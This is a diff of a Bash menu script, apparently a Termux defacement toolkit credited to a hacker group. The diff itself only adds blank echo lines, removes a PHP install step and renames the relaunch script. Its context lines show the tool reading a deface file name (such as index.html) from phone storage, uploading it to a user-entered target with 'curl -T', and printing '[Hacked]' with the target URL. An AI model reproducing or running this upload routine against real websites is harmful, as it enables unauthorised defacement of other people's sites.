@@ -134,6 +134,7 @@ echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/Nama SC Harus(index.html)"$whit
 read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
 echo $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
+echo
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] : " back
 fi
@@ -147,9 +148,9 @@ clear
 echo
 echo
 echo
-pkg install php
 cd Files
 php kamu.php
+echo
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] : " back
 fi
@@ -274,6 +275,7 @@ echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target20
 curl -T /storage/emulated/0/$script $target20
 echo $cyan"["$green"+"$cyan"]"$red"$target20/$script"
+echo
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] : " back
 fi
@@ -301,6 +303,7 @@ echo $cyan"[+] MR.W3B_XIT "
 echo $cyan"[+] MR.L3RBI & All Member [I.C.A] "
 echo $red"##########################$green" WELCOME "$red###########################"
 echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] " back
 fi
@@ -308,6 +311,7 @@ fi
 if [ $apaan = "T" ] || [ $apaan = "t" ]
 then
 cat tutorial.txt
+echo
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] " back
 fi
@@ -322,7 +326,7 @@ fi
 
 if [ $back = "B" ] || [ $back = "b" ]
 then
-sh ICA.sh
+sh tools.sh
 fi
 
 if [ $back = "Q" ] || [ $back = "q" ]
